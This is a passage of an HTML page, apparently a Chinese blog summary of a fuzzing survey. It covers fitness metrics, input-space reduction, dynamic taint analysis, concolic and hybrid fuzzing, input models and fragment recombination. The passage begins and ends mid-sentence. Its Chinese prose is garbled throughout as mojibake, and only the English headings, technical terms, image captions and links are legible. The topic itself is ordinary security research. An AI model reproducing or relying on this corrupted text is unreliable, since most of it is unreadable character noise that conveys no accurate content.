é€šå¸¸é€šè¿‡æ­ç§¯æœ¨çš„æ–¹å¼æ¥æ¨æ–­å‡ºçŠ¶æ€æœºï¼šä»¥ä¸€ç»„ç§å­èµ·å§‹å˜å¼‚ä»¥è·å–æ–°çš„çŠ¶æ€ï¼ŒåŸºäºçŠ¶æ€æœºåˆ†ææ¼æ´ç‚¹å¹¶æœå¯»å¯èƒ½å­˜åœ¨æ¼æ´çš„çŠ¶æ€è½¬ç§»</p></li><li><p><em>Safety policy of robotic vehicles</em> ï¼šæœºå™¨è£…ç½®çš„ç‰©ç†&#x2F;åŠŸèƒ½å®‰å…¨éœ€è¦  <em>å®‰å…¨ç­–ç•¥</em> ï¼ˆsafety policyï¼Œä¾‹å¦‚æœºå™¨çš„æ¸©åº¦é™åˆ¶ï¼‰ï¼Œå› æ­¤å¯ä»¥ä¿ç•™æ¥è¿‘è¿åå®‰å…¨ç­–ç•¥çš„è¾“å…¥ä½œä¸ºç§å­è¿›è¡Œå˜å¼‚</p></li><li><p><em>Fitness for deep learning system</em> ï¼šå¯¹æ·±åº¦å­¦ä¹ ç³»ç»Ÿï¼ˆDeep Learning Systemsï¼ŒDLSsï¼‰çš„æ¨¡ç³Šæµ‹è¯•è®¾è®¡äº†å‡ ç§ä¸åŒçš„ fitness</p></li></ul><blockquote><p>ä¾‹å¦‚ç¥ç»å…ƒè¦†ç›–ç‡ä»¥å‘ç°æç«¯åœºæ™¯ï¼ˆcorner casesï¼‰ï¼ŒæŸå¤±å‡½æ•°ä»¥å¢å¼ºè®­ç»ƒæ•°æ®ï¼Œæ“ä½œç¬¦å±‚ï¼ˆoperator-levelï¼‰è¦†ç›–ç‡ä»¥æ¢ç´¢æ·±åº¦å­¦ä¹ æ¨ç†æœºï¼ˆinference enginesï¼‰</p></blockquote><ul><li><p><em>Validation log for Android SmartTVs</em> ï¼š validation log å¯ä»¥è¢«ç”¨æ¥æ¨æ–­åˆæ³•çš„è¾“å…¥ä»¥åŠè·å–è¾“å…¥è¾¹ç•Œï¼Œè¿™ä¸º fuzzer æä¾›äº†é«˜æ•ˆçš„ç§å­ä¸”ç¼©å°äº†è¾“å…¥ç©ºé—´</p></li><li><p><em>Behavioral asymmetry of testing</em> ï¼šåœ¨å·®å¼‚æµ‹è¯•ä¸‹ï¼ˆdifferential testingï¼‰ï¼Œå¯ä»¥é€šè¿‡åœ¨ç›¸åŒåŠŸèƒ½å®ç°çš„ç›¸åŒè¾“å…¥ä¸Šè§‚æµ‹åˆ°ä¸åŒè¡Œä¸ºæ¥å‘ç°æ¼æ´</p></li><li><p><em>Alias coverage for data race</em> ï¼š alias coverage é€šè¿‡è·Ÿè¸ªä¸€å¯¹å¯èƒ½äº¤äº’çš„å†…å­˜è®¿é—®ï¼Œä»¥æ­¤å‘ç°ç”±äºç¼ºä¹åˆé€‚çš„åŒæ­¥æœºåˆ¶å¯¼è‡´çš„æ¡ä»¶ç«äº‰æ¼æ´</p></li></ul><blockquote><p>æ–‡ä¸­æåˆ°çš„æ˜¯å†…æ ¸æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ¡ä»¶ç«äº‰ï¼Œç”±äºä¸¤ä¸ªçº¿ç¨‹è®¿é—®ä¸€å—å…±äº«å†…å­˜æ—¶ç¼ºä¹åˆé€‚çš„åŒæ­¥æœºåˆ¶å¯¼è‡´ï¼Œä½†ç¬”è€…è§‰å¾—æ¡ä»¶ç«äº‰åº”è¯¥ä¸å±€é™äºè¿™æ ·çš„æƒ…å†µï¼ˆ</p></blockquote><ul><li><em>Dangerous locations for bugs</em> ï¼šå±é™©åŒºåŸŸæ˜¯å®¹æ˜“è§¦å‘æ¼æ´çš„åŒºåŸŸï¼Œfuzzer å¯ä»¥ç›´æ¥å°†èµ„æºé›†ä¸­åœ¨ä¸Šè¾¹è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ä»¥æé«˜æ•ˆç‡</li></ul><blockquote><p>ä¾‹å¦‚å¯¹å¹¶å‘æ¼æ´è€Œè¨€å¯ä»¥æ˜¯ä¼šé€ æˆå¯¹åŸå­æ€§çš„è¿åã€æ¡ä»¶ç«äº‰ç­‰çš„ä»£ç åŒºåŸŸï¼Œå¯¹äºéå¹¶å‘æ¼æ´è€Œè¨€å¯ä»¥é€šè¿‡è¡¥ä¸æµ‹è¯•ã€å´©æºƒå¤ç°ã€é™æ€åˆ†ææŠ¥å‘Šã€ä¿¡æ¯æµæ£€æµ‹æ¥è·å¾—ï¼Œæ­¤å¤–å±é™©åŒºåŸŸä¹Ÿå¯ä»¥æ˜¯å†…å­˜è®¿é—®ã€sanitizer æ£€æŸ¥æˆ–æ˜¯ commit è®°å½•</p></blockquote><h2 id="3-6-Evaluation-Theory"><a href="#3-6-Evaluation-Theory" class="headerlink" title="3.6 Evaluation Theory"></a>3.6 Evaluation Theory</h2><p>ä¸€ä¸ªåˆé€‚çš„<strong>è¯„ä¼°</strong>ï¼ˆevaluationï¼‰å¯ä»¥åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­å¸®åŠ©å…¶æé«˜è¡¨ç°ï¼ŒåŒ…æ‹¬æœ‰æ•ˆå®éªŒè¯­æ–™åº“ã€å…¬å¹³çš„è¯„ä¼°ç¯å¢ƒã€åˆç†çš„æ¨¡ç³Šæµ‹è¯•æ—¶é—´ã€å…¨é¢çš„å¯¹æ¯”æŒ‡æ ‡</p><blockquote><p><strong>Gap 1</strong>ï¼šæ¨¡ç³Šæµ‹è¯•ç†è®ºç¼©å°äº†è¾“å…¥ç©ºé—´ä¸ç¼ºé™·ç©ºé—´çš„å·®è·ï¼ŒåŸºäºç¨‹åºè¡¨ç°ï¼ˆå¦‚æ¼æ´åˆ°è¾¾ã€çŠ¶æ€è½¬ç§»ã€çŠ¶æ€å‘ç°ï¼‰è§„åˆ’æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ï¼Œå¤§éƒ¨åˆ†çš„ç†è®ºè§„åˆ’äº†ç§å­è°ƒåº¦ï¼Œå‡ ä¹æ‰€æœ‰çš„ fuzzer åŸºäºé—ä¼ ç®—æ³•è§„åˆ’ç§å­å­˜ç•™</p></blockquote><h1 id="0x04-SEARCH-SPACE-OF-INPUTS"><a href="#0x04-SEARCH-SPACE-OF-INPUTS" class="headerlink" title="0x04. SEARCH SPACE OF INPUTS"></a>0x04. SEARCH SPACE OF INPUTS</h1><p>ä¸ºäº†ç¼©å°è¾“å…¥ç©ºé—´ã€æå‡æ¨¡ç³Šæµ‹è¯•çš„æ€§èƒ½ï¼Œfuzzers å°†ä¸€ä¸ªè¾“å…¥ä¸­çš„<strong>å…³è”å­—èŠ‚</strong>ï¼ˆrelated bytesï¼Œä¾‹å¦‚ç»„æˆåŒä¸€æ•°æ®ç»“æ„ã€å½±å“åŒä¸€è·¯å¾„çº¦æŸã€ç¬¦åˆåŒä¸€æ–‡æ³•ï¼‰åˆ†ç»„å¹¶ä¸ºæ¯ä¸€ç»„ä½¿ç”¨ç‰¹å®šçš„å˜å¼‚å™¨ï¼ˆåŒ…æ‹¬å­—èŠ‚å˜å¼‚ä¸å—å˜å¼‚ï¼‰</p><blockquote><p> å‡è®¾è¾“å…¥ç©ºé—´ä¸­æœ‰ <code>a* b</code> å­—èŠ‚ï¼Œå°†å…¶ç­‰åˆ†ä¸º a å—ï¼Œåˆ™ç›¸è¾ƒäº <em>256<sup>a*b</sup></em> è€Œè¨€ï¼Œå¯¹äºç‰¹å®šè·¯å¾„çº¦æŸçš„æœç´¢ç©ºé—´ä»…ä¸º <em>a * 256<sup>b</sup></em> </p></blockquote><p>åœ¨è·¯å¾„çº¦æŸæ±‚è§£ä¸­ï¼Œå¯¹å…³è”å­—èŠ‚çš„å…³æ³¨åŒæ ·èƒ½ç¼©å°æœç´¢ç©ºé—´ï¼Œä¾‹å¦‚ Fig4.a åœ¨ç¬¬ 13 è¡Œçš„çº¦æŸæ»¡è¶³çš„æƒ…å†µä¸‹ç¬¬14è¡Œä»…ä¸ä¸€ä¸ªå­—èŠ‚ç›¸å…³è”</p><p>ä¸€ç§ç‰¹æ®Šçš„è¾“å…¥æ˜¯ä¸ºå¦‚åè®®ã€ç¼–è¯‘å™¨ç­‰è¿›è¡Œé«˜åº¦ç»“æ„åŒ–çš„è¾“å…¥ï¼Œå¦‚ Fig4.b ä¸­ä»£ç éœ€è¦ä¸€ä¸ªç‰¹æ®Šèµ·å§‹æ ¼å¼çš„è¾“å…¥</p><p><img src="https://s2.loli.net/2022/10/27/PNphaetFqYm8jVJ.png" alt="Fig. 4. Search space of input. "></p><p>Table 2 ä¸­çš„ fuzzers çš„ä¸»è¦è´¡çŒ®æ˜¯ç¼©å°è¾“å…¥ç©ºé—´ï¼š</p><p><img src="https://s2.loli.net/2022/10/27/JweSDsxm8UZCTLk.png" alt="Table 2. Input space. Fuzzers reduce the input space by grouping the related bytes. The groups of bytes are obtained based on certain relation."></p><h2 id="4-1-Byte-constraint-Relation"><a href="#4-1-Byte-constraint-Relation" class="headerlink" title="4.1 Byte-constraint Relation"></a>4.1 Byte-constraint Relation</h2><p>å¤§éƒ¨åˆ†çš„è·¯å¾„çº¦æŸä»…è¢«ä¸€å°éƒ¨åˆ†è¾“å…¥æ‰€å½±å“ï¼Œå› æ­¤è‹¥ fuzzer ä»…å˜å¼‚å…³è”å­—èŠ‚ï¼Œåˆ™èƒ½é€šè¿‡ç¼©å°è¾“å…¥çš„æœç´¢ç©ºé—´ä»è€Œæ˜¾è‘—åœ°æå‡æ€§èƒ½</p><blockquote><p>ä¾‹å¦‚æˆ‘ä»¬éœ€è¦å˜å¼‚ä¸€ä¸ªå­—èŠ‚æ•°ç»„ a[10] éœ€è¦ç”Ÿæˆ <em>256<sup>11</sup></em> ä¸ªè¾“å…¥ï¼Œä½†è‹¥æ˜¯æˆ‘ä»¬çŸ¥é“ä»…æœ‰ a[2] çš„å€¼æ˜¯æœ‰ç”¨çš„ï¼Œåˆ™æˆ‘ä»¬ä»…éœ€è¦ç”Ÿæˆ 256 ä¸ªè¾“å…¥</p></blockquote><p>åœ¨è·å¾—å­—èŠ‚çº¦æŸå…³ç³»åï¼Œå¯ä»¥éšæœºåœ°æˆ–ä»0~255 è¿›è¡Œå˜å¼‚ï¼Œä½†éƒ½æ¯”è¾ƒä½æ•ˆï¼›è‹¥åœ¨å­—èŠ‚å…³ç³»çš„æ¨æ–­è¿‡ç¨‹ä¸­å¯ä»¥è·å¾—æ¯”è¾ƒæŒ‡ä»¤çš„å€¼ï¼Œfuzzer å¯ä»¥åœ¨å˜å¼‚æ—¶é€‰æ‹©é€šè¿‡è·¯å¾„çº¦æŸçš„å€¼</p><p>æ­¤å¤–ï¼Œæ¨¡ç³Šæµ‹è¯•å¯ä»¥ä½¿ç”¨ <em>å¡åº¦ä¸‹é™ç®—æ³•</em> ï¼ˆgradient descent algorithmï¼‰æ¥å˜å¼‚å…³è”å­—èŠ‚å¹¶é€æ¸è§£å†³è·¯å¾„çº¦æŸ</p><h3 id="4-1-1-Dynamic-Taint-Analysis"><a href="#4-1-1-Dynamic-Taint-Analysis" class="headerlink" title="4.1.1 Dynamic Taint Analysis"></a>4.1.1 Dynamic Taint Analysis</h3><p><strong>åŠ¨æ€æ±¡ç‚¹åˆ†æ</strong>ï¼ˆDynamic Taint Analysisï¼ŒDTAï¼‰æ˜¯åœ¨æ„å»ºè¾“å…¥ä¸è·¯å¾„çº¦æŸçš„å…³ç³»ä¸­å¸¸ç”¨çš„ä¸€é¡¹æŠ€æœ¯ï¼Œå…¶é€šè¿‡<strong>åœ¨è¾“å…¥ä¸­è¿›è¡Œæ ‡è®°ååœ¨è¿è¡Œä¸­ä¼ æ’­æ ‡ç­¾ï¼ˆlabelï¼‰å¹¶æ£€æŸ¥è·å–åˆ°æ ‡ç­¾çš„å˜é‡</strong>çš„æ–¹å¼æ¥æ„å»ºå˜é‡ä¸æ•°æ®çš„å…³è”</p><p>fuzzer å¯ä»¥ä½¿ç”¨ DTA æ¥æ„å»ºè¾“å…¥ä¸å®‰å…¨æ•æ„Ÿç‚¹ï¼ˆsecurity-sensitive pointsï¼Œä¾‹å¦‚æ¡ä»¶è·³è½¬æˆ–ç³»ç»Ÿè°ƒç”¨ï¼‰é—´çš„å…³ç³»</p><h3 id="4-1-2-Relation-Inference"><a href="#4-1-2-Relation-Inference" class="headerlink" title="4.1.2 Relation Inference"></a>4.1.2 Relation Inference</h3><p>DTA éœ€è¦å¤§é‡çš„äººå·¥ä¸”å¯èƒ½è·å¾—ä¸å‡†ç¡®çš„å…³ç³»ï¼ˆdue to implicit data flowï¼‰ã€‚ç”±äº fuzzing è¿‡ç¨‹ä¸­éœ€è¦å¤§é‡æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹ï¼Œä¸€ç§è½»é‡çš„è§£å†³æ–¹æ¡ˆæ˜¯åœ¨è¿è¡Œæ—¶æ¨æ–­å­—èŠ‚å…³è”ï¼Œæœ‰ä¸¤ç§å…·ä½“æ–¹æ¡ˆï¼š</p><ul><li>è§‚æµ‹æ˜¯å¦å¯¹ä¸€ä¸ªå­—èŠ‚çš„å˜å¼‚æ”¹å˜äº†å˜é‡çš„å€¼ï¼Œè¿™æ„å‘³ç€è¯¥å­—èŠ‚å¯èƒ½ä¸å˜é‡ã€æ¯”è¾ƒæŒ‡ä»¤æˆ–åˆ†æ”¯ç›¸å…³è”</li><li>åŸºäºæ·±åº¦å­¦ä¹ æ„å»ºè¾“å…¥å­—èŠ‚ä¸åˆ†æ”¯è¡Œä¸ºé—´å¤§æ¦‚çš„å…³ç³»</li></ul><h2 id="4-2-Concolic-Execution"><a href="#4-2-Concolic-Execution" class="headerlink" title="4.2 Concolic Execution"></a>4.2 Concolic Execution</h2><p><strong>æ··åˆæ‰§è¡Œ</strong>ï¼ˆConcolic Executionï¼Œaka dynamic symbolic executionï¼‰å°†ç¨‹åºå˜é‡è§†ä½œ<strong>ç¬¦å·å˜é‡</strong>ï¼ˆsymbolic variablesï¼‰ï¼Œè·Ÿè¸ªè·¯å¾„çº¦æŸå¹¶ä½¿ç”¨çº¦æŸæ±‚è§£å™¨æ¥ä¸ºç‰¹å®šè·¯å¾„ç”Ÿæˆå…·ä½“è¾“å…¥ï¼šé€šè¿‡æ±‚è§£è·¯å¾„çº¦æŸæ¥ç¼©å°è¾“å…¥ç©ºé—´</p><blockquote><p>å…³äºä»€ä¹ˆæ˜¯ concolic executionï¼Œå¯ä»¥çœ‹è¿™å¼ å›¾ï¼ˆ<del>å¦‚æœä½ ä¸çŸ¥é“ç¬¦å·æ‰§è¡Œé‚£ğŸ‘´å»ºè®®å…ˆåˆ«çœ‹äº†</del>ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2022/10/27/Fvl3yRNMnzKamfk.jpg" alt="concolic execution"></p></blockquote><p>åŒæ—¶ä½¿ç”¨ç¬¦å·æ‰§è¡Œä¸æ¨¡ç³Šæµ‹è¯•çš„æŠ€æœ¯ç§°ä¹‹ä¸º<strong>æ··åˆæ¨¡ç³Šæµ‹è¯•</strong>ï¼ˆhybrid fuzzingï¼‰æˆ–<strong>ç™½ç›’æ¨¡ç³Šæµ‹è¯•</strong>ï¼ˆwhitebox fuzzingï¼‰ï¼šä½¿ç”¨æ¨¡ç³Šæµ‹è¯•æ¥æ‰§è¡Œç›®æ ‡ç¨‹åºä¸­çš„æ‰§è¡Œè·¯å¾„ï¼‹ä½¿ç”¨ç¬¦å·æ‰§è¡Œæ¥æ±‚è§£æ‰§è¡Œè·¯å¾„ä¸­çš„çº¦æŸ</p><p>ç”±äºä¸ºæ¯æ¡æ‰§è¡Œè·¯å¾„éƒ½ä½¿ç”¨ç¬¦å·æ‰§è¡Œä¼šéå¸¸è€—æ—¶ï¼Œå› æ­¤å½“ fuzzing æ— æ³•è·å¾—æ›´å¤šçŠ¶æ€æ—¶ï¼Œæ··åˆæ‰§è¡Œè¢«ç”¨ä»¥è§£å†³ fuzzing æ— æ³•æ»¡è¶³çš„è·¯å¾„çº¦æŸ</p><p>æ··åˆæ¨¡ç³Šæµ‹è¯•çš„ä¸€ä¸ªæ”¹è¿›ä¾¿æ˜¯ä¸ºæ··åˆæ‰§è¡Œæ’åºå‡ºæœ€éš¾çš„è·¯å¾„ä¾›å…¶è§£å†³ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¼€å‘ä¸€ä¸ªå¤§æ¦‚çš„çº¦æŸæ±‚è§£å™¨æ¥æå‡ï¼Œé€šå¸¸<strong>å¯æ»¡è¶³æ€§æ¨¡ç†è®º</strong>ï¼ˆsatisfiability modulo theoryï¼ŒSTMï¼‰æ±‚è§£å™¨ï¼ˆä¾‹å¦‚ z3 æˆ– MathSAT5ï¼‰è¢«ç”¨æ¥æ±‚è§£è·¯å¾„çº¦æŸï¼Œä½†å­˜åœ¨å¤æ‚çº¦æŸåŠè·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ï¼Œä¸ºäº†ç¼“è§£è¿™ä¸ªé—®é¢˜ï¼Œçº¦æŸæ±‚è§£å™¨ä»…ç¬¦å·åŒ–è¢«è¾“å…¥å½±å“çš„è·¯å¾„</p><p>å¦ä¸€ä¸ªæ”¹è¿›ä¾¿æ˜¯è®©çº¦æŸæ±‚è§£å™¨ä½¿ç”¨ç°ç›’æ¨¡å¼ï¼Œä¾‹å¦‚ï¼Œå…¶ä½¿ç”¨çº¿æ€§å‡½æ•°ä»¥æ¥è¿‘çº¦æŸè¡Œä¸ºï¼Œå› ä¸ºå¤§éƒ¨åˆ†çš„è·¯å¾„çº¦æŸè¢«å‘ç°éƒ½æ˜¯è¶‹å‘äºæ˜¯çº¿æ€§çš„æˆ–å•è°ƒçš„</p><p>ç ”ç©¶äººå‘˜ä¹Ÿå¼€å§‹ä½¿ç”¨æ¨¡ç³Šæµ‹è¯•æ¥æ±‚è§£è·¯å¾„çº¦æŸï¼Œä¾‹å¦‚ <a href="https://dl.acm.org/doi/10.1145/3338906.3338921">JFS</a> å°† SMT å…¬å¼ç¿»è¯‘ä¸ºç¨‹åºå¹¶ä½¿ç”¨è¦†ç›–ç‡æŒ‡å¯¼çš„æ¨¡ç³Šæµ‹è¯•æ¥æ¢ç´¢ç¨‹åºï¼Œæ¨¡ç³Šæµ‹è¯•ç”Ÿæˆçš„è¾“å…¥åˆ°è¾¾ç‰¹å®šåŒºåŸŸæˆ–ç›¸åº”çš„ç¨‹åºæ—¶æ„å‘³ç€è§£å‡ºäº† SMT å…¬å¼</p><p>çº¦æŸæ±‚è§£å™¨ä¹Ÿå¯ä»¥åŸºäºç›®æ ‡çš„ç‰¹æ€§è¿›è¡Œæ”¹è¿›ï¼Œ<a href="https://ieeexplore.ieee.org/document/9152662">Pangolin</a> ä½¿ç”¨å¤šé¢è·¯å¾„æŠ½è±¡ï¼ˆpolyhedral path abstractionï¼‰æ¥è§£å†³åµŒå¥—è·¯å¾„çº¦æŸï¼ˆnested path constraintsï¼‰ï¼Œè¿™ç§æ–¹æ³•ä¼šä¿ç•™å†å²çº¦æŸçš„è§£ç­”ç©ºé—´ï¼ˆsolution spaceï¼‰å¹¶é‡ç”¨è§£ç­”ç©ºé—´ä»¥æ»¡è¶³å½“å‰è·¯å¾„çº¦æŸçš„å¯è¾¾æ€§</p><blockquote><p>ä¾‹å¦‚å¯¹äº Fig4.a ä¸­çš„ç¬¬14è¡Œçš„çº¦æŸï¼Œè¾“å…¥é¦–å…ˆè¦æ»¡è¶³ç¬¬13è¡Œçš„çº¦æŸ</p></blockquote><p>ä¸ºäº†åœ¨éœ€è¦é«˜åº¦ç»“æ„åŒ–çš„è¾“å…¥çš„ç¨‹åºä¸­ä½¿ç”¨æ··åˆæ¨¡ç³Šæµ‹è¯•ï¼Œ<a href="https://dl.acm.org/doi/10.1145/1375581.1375607">Godefroid</a> å°†æ–‡æ³•ä¸­çš„è¯ç´ ï¼ˆtokenï¼‰ç¬¦å·åŒ–ä¸ºç¬¦å·å˜é‡ï¼Œå¹¶ä½¿ç”¨ä¸Šä¸‹æ–‡æ— å…³çš„çº¦æŸæ±‚è§£å™¨ï¼ˆcontext-free constraint solverï¼‰æ¥ç”Ÿæˆæ–°çš„è¾“å…¥</p><h2 id="4-3-Program-Transformation"><a href="#4-3-Program-Transformation" class="headerlink" title="4.3 Program Transformation"></a>4.3 Program Transformation</h2><p>å¯¹æ¨¡ç³Šæµ‹è¯•è€Œè¨€ï¼Œ<strong>ç¨‹åºè½¬æ¢</strong>ï¼ˆprogram transformationï¼‰çš„ç›®çš„æ˜¯ç§»é™¤é˜²æ­¢æ¨¡ç³Šæµ‹è¯•å‘ç°æ›´å¤šæ‰§è¡ŒçŠ¶æ€çš„å®Œæ•´æ€§æ£€æŸ¥ï¼Œé€šè¿‡ç§»é™¤è¿™äº›æ£€æŸ¥ï¼Œæ¨¡ç³Šæµ‹è¯•å¯ä»¥æ¢ç´¢åˆ°ç›®æ ‡ç¨‹åºæ›´æ·±å¤„çš„ä»£ç å¹¶æš´éœ²å‡ºæ½œåœ¨çš„æ¼æ´ï¼Œä½†è¿™ä¹Ÿä¼šå¼•å…¥ä¸€äº›è¯¯æŠ¥ï¼ˆfalse positivesï¼‰ï¼Œå¯ä»¥é€šè¿‡ç¬¦å·æ‰§è¡Œè¿›è¡ŒéªŒè¯</p><p>å› æ­¤ program transformation é€šè¿‡èšç„¦äºå¯èƒ½è§¦å‘æ¼æ´çš„è¾“å…¥æ¥ç¼©å°æœç´¢ç©ºé—´</p><h2 id="4-4-Input-Model"><a href="#4-4-Input-Model" class="headerlink" title="4.4 Input Model"></a>4.4 Input Model</h2><p>è®¸å¤šåº”ç”¨ç¨‹åºéƒ½éœ€è¦é«˜åº¦ç»“æ„åŒ–çš„è¾“å…¥ï¼Œä¾‹å¦‚åè®®å®ç°ã€ç³»ç»Ÿè°ƒç”¨ç­‰ï¼Œ<strong>è¾“å…¥æ¨¡å‹</strong>ï¼ˆinput modelï¼‰æŒ‡å®šäº†æ„é€ é«˜åº¦ç»“æ„åŒ–è¾“å…¥çš„è§„åˆ™ï¼ŒåŒ…æ‹¬ç»“æ„ä½“ã€æ ¼å¼ã€è¾“å…¥çš„æ•°æ®çº¦æŸï¼Œå³è¿åè¯­æ³•æˆ–è¯­ä¹‰çš„è¾“å…¥ä¼šåœ¨ä¸€å¼€å§‹å°±è¢«æ‹’ç»ï¼Œç”±æ­¤<strong>è¾“å…¥ç©ºé—´ä¾¿è¢«é™åˆ¶äºè¾“å…¥æ¨¡å‹</strong></p><h3 id="4-4-1-Accessible-Models-or-Tools"><a href="#4-4-1-Accessible-Models-or-Tools" class="headerlink" title="4.4.1 Accessible Models or Tools"></a>4.4.1 Accessible Models or Tools</h3><p>åŸºäºç©ºç™½è§„èŒƒï¼ˆbare specificationsï¼‰çš„è¾“å…¥ç”Ÿæˆéœ€è¦ç¹é‡çš„å·¥ç¨‹å·¥ä½œï¼Œå¤æ‚è§„èŒƒçš„è§£æä¹Ÿéå¸¸å®¹æ˜“å‡ºé”™ï¼Œå› æ­¤ç ”ç©¶ç¤¾åŒºä¸ºä¸€äº›é«˜åº¦ç»“æ„åŒ–çš„è¾“å…¥å¼€æºäº†ä¸€äº›å·¥å…·</p><blockquote><p>ä¾‹å¦‚ <a href="https://dl.acm.org/doi/10.1145/357766.351266">QuickCheck</a> å’Œ <a href="https://www.antlr.org/">ANTLR</a>ï¼Œä¾‹å¦‚ <a href="https://www.ndss-symposium.org/ndss-paper/nautilus-fishing-for-deep-bugs-with-grammars/">NAUTILUS</a> ä¸ <a href="https://www.researchgate.net/publication/335427315_Superion_Grammar-Aware_Greybox_Fuzzing">Superion</a> ä¾¿åŸºäº ANTLR ç”Ÿæˆè¾“å…¥</p></blockquote><p>åœ¨ä¸€äº›åœºæ™¯ä¸‹è¾“å…¥æ¨¡å‹ä¹Ÿå¯ä»¥æ˜¯è¾“å…¥çš„ç±»å‹ï¼ˆä¾‹å¦‚ API å‚æ•°æˆ–ç‰©ç†ä¿¡å·ï¼‰</p><h3 id="4-4-2-Integration-of-Implementations"><a href="#4-4-2-Integration-of-Implementations" class="headerlink" title="4.4.2 Integration of Implementations"></a>4.4.2 Integration of Implementations</h3><p>å¦ä¸€ä¸ªå‰æ™¯è¾ƒå¥½çš„æ–¹æ¡ˆæ˜¯å°†æ¨¡ç³Šæµ‹è¯•ä¸ç›®æ ‡åº”ç”¨è¿›è¡Œé›†æˆï¼Œè¿™æ ·çš„é›†æˆå…è®¸æ¨¡ç³Šæµ‹è¯•é€šè¿‡å®¢åˆ¶åŒ–è¾“å…¥ç”Ÿæˆè¿‡ç¨‹æ¥æµ‹è¯•é¢„æœŸæ€§èƒ½</p><blockquote><p>ä¾‹å¦‚ <a href="https://dl.acm.org/doi/10.1145/2976749.2978411">TLS-Attacker</a> åˆ›é€ äº†èƒ½åŸºäºæ¯ä¸ªæ®µçš„ç±»å‹å˜å¼‚è¾“å…¥çš„æ¡†æ¶ï¼Œå¹¶èƒ½æ”¹å˜åè®®æ¶ˆæ¯çš„é¡ºåº</p></blockquote><h3 id="4-4-3-Intermediate-Representation"><a href="#4-4-3-Intermediate-Representation" class="headerlink" title="4.4.3 Intermediate Representation"></a>4.4.3 Intermediate Representation</h3><p>å¦ä¸€ä¸ªå¤æ‚çš„æ–¹æ¡ˆæ˜¯å°†è¾“å…¥æ¨¡å‹è½¬åŒ–ä¸ºä¸€ç§<strong>ä¸­é—´è¡¨ç¤º</strong>ï¼ˆIntermediate Representationï¼‰ï¼š</p><ul><li>å°†åŸå§‹è¾“å…¥æ–‡ä»¶ç¿»è¯‘ä¸ºæ›´ç®€å•ä¸”æ›´ç»Ÿä¸€çš„ IRï¼Œfuzzer åŸºäº IR è¿›è¡Œå˜å¼‚åå†ç¿»è¯‘å›åŸå§‹è¾“å…¥æ ¼å¼</li></ul><p>è¿™ç§å˜å¼‚ç­–ç•¥èƒ½åœ¨ä¿æŒäº†è¯­æ³•ä¸è¯­ä¹‰çš„æ­£ç¡®æ€§çš„åŒæ—¶ç”Ÿæˆäº†å¤šç§è¾“å…¥</p><h2 id="4-5-Fragment-Recombination"><a href="#4-5-Fragment-Recombination" class="headerlink" title="4.5 Fragment Recombination"></a>4.5 Fragment Recombination</h2><p>å¦ä¸€ç§ç”Ÿæˆè¾“å…¥çš„æ–¹å¼æ˜¯é€šè¿‡<strong>ç¢ç‰‡é‡æ•´åˆ</strong>ï¼ˆfragment recombinationï¼‰ï¼šå°†è¾“å…¥æ–‡ä»¶åˆ†æˆè®¸å¤šçš„å°å—ï¼ˆfragmentsï¼‰ï¼Œé€šè¿‡ä»ä¸åŒæ–‡ä»¶ä¸­æ•´åˆç¢ç‰‡æ¥ç”Ÿæˆæ–°çš„è¾“å…¥ï¼ŒåŒæ—¶æ¯ä¸ªç¢ç‰‡åº”ç¬¦åˆè§„èŒƒä»¥ç¡®ä¿è¯­æ³•æ­£ç¡®æ€§</p><p><img src="https://s2.loli.net/2022/10/28/GqE5UckCFQie96L.png" alt="Fig. 5. Fragment Recombination."></p><p>å¦‚ Fig.5 æ‰€ç¤ºï¼Œfuzzer é¦–å…ˆå°†è¾“å…¥æ–‡ä»¶è§£ææˆä¸€æ£µä¿æŒè¯­æ³•æ­£ç¡®æ€§çš„æ ‘ï¼ˆä¾‹å¦‚ ASTï¼‰ï¼Œè¿™éœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„è¾“å…¥è¯­æ–™åº“æ¥è§£æè¾“å…¥ï¼ŒåŒæ—¶ fuzzer è¿˜éœ€è¦ä¸ºè¯­æ–™åº“æ”¶é›†æ­¤å‰é€ æˆé”™è¯¯è¡Œä¸ºçš„æœ‰é—®é¢˜çš„è¾“å…¥</p><p>åœ¨æ­¤å‰æ›¾ç»å‘ç°æ¼æ´çš„åŒºåŸŸæˆ–é™„è¿‘ä»æœ‰å¯èƒ½å­˜åœ¨æ–°çš„æ¼æ´ï¼Œè€Œæœ‰é—®é¢˜çš„è¾“å…¥å·²æ‰§è¡Œäº†èƒ½é€ æˆé”™è¯¯è¡Œä¸ºçš„å¤æ‚è·¯å¾„ï¼Œå› æ­¤ç¢ç‰‡é‡æ•´åˆå¯èƒ½ä¼šæ‰§è¡ŒåŒæ ·æˆ–ç›¸ä¼¼çš„è·¯å¾„ï¼Œè¿™æœ‰åˆ©äºæ¢ç´¢æ›´æ·±çš„ä»£ç </p><p>åœ¨ç¬¬äºŒé˜¶æ®µè¾“å…¥è¢«ç¢ç‰‡åŒ–åä¼šå­˜æ”¾åˆ°ç¢ç‰‡æ± ä¸­ï¼Œç”±äºè¾“å…¥è¢«è§£ææˆ ASTï¼Œfuzzer å¯ä»¥ä½¿ç”¨éç»ˆæ­¢èŠ‚ç‚¹ï¼ˆnon-terminalsï¼‰æ¥ç»„æˆæ–°çš„å­æ ‘ï¼Œåœ¨é‡æ•´åˆç¢ç‰‡æ—¶åŸºäº éšæœº&#x2F;é—ä¼ ç®—æ³•&#x2F;æœºå™¨å­¦ä¹  æ¥é€‰ç”¨è¯­æ³•å…¼å®¹çš„ï¼ˆsyntactically compatibleï¼‰ç¢ç‰‡ï¼Œæ­¤å¤–è¯­ä¹‰æ­£ç¡®æ€§ä¹Ÿå¯¹æ¨¡ç³Šæµ‹è¯•çš„æ•ˆç‡æœ‰é‡è¦å½±å“</p><blockquote><p>ä¾‹å¦‚ <a href="https://www.ndss-symposium.org/ndss-paper/codealchemist-semantics-aware-code-generation-to-find-vulnerabilities-in-javascript-engines/">CodeAlchemist</a> ä½¿ç”¨æ±‡ç¼–çº¦æŸæ 